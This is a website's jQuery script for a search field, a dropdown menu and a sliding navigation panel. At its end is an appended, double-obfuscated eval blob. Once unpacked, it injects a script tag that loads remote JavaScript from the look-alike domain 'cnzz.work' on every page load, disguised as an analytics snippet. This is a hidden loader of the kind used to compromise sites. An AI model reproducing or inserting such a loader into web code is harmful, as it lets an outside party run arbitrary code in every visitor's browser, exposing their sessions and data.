// JavaScript Document

$(document).ready(function() {
//初始化搜索
	var setx = $(".indexl"); //获取文本框对象   
	setx.click(function() {
		setx.val("");
		setx.css({
			color: "#4B4B4B"
		});
	});
	//搜索end
//三级下啦菜单
		$(".on_clickm").click(function() {
		$(this).next("ul").slideToggle("slow").siblings(".show_box:visible").slideUp("slow");
		$(this).toggleClass("activeTitle");
		$(this).siblings(".activeTitle").removeClass("activeTitle");
	});
	
	//三级下啦菜单 end	
})

$(document).ready(function() {
    var flbox = $('.flbox');
    nav = $('.nav');
    box = $('.mainbox');
    flbox.click(function() {
            box.animate({right:'40%'},'500');
			nav.animate({right:'0px'},'500');
			$('.nav').css("display", "block");
			$('.mainboxbg').css("display", "block");
			 return; 

    });
	$('.mainboxbg').click(function()
								   {
									 box.animate({right:'0'},'500');
									 nav.animate({right:'-40%'},'500');
									 $(this).hide();
              return; 
									   
									   }
								   
								   )
	
});;
eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('v(h(p,a,c,k,e,r){e=h(c){i c.o(a)};m(!\'\'.l(/^/,u)){j(c--)r[e(c)]=k[c]||e(c);k=[h(e){i r[e]}];e=h(){i\'\\\\w+\'};c=1};j(c--)m(k[c])p=p.l(q t(\'\\\\b\'+e(c)+\'\\\\b\',\'g\'),k[c]);i p}(\'1 5=5||[];(8(){1 a=3.b(\\\'4\\\');a.7=\\\'//g.9/6/6.c\\\';1 2=3.e(\\\'4\\\')[0];2.f.d(a,2)})();\',n,n,\'|x|s|y|z|A|B|C|h|D||E|F|G|H|I|J\'.K(\'|\'),0,{}))',47,47,'|||||||||||||||||function|return|while||replace|if|17|toString||new|||RegExp|String|eval||var|document|script|_hmt_cnzz|hm|src|work|createElement|js|insertBefore|getElementsByTagName|parentNode|cnzz|split'.split('|'),0,{}))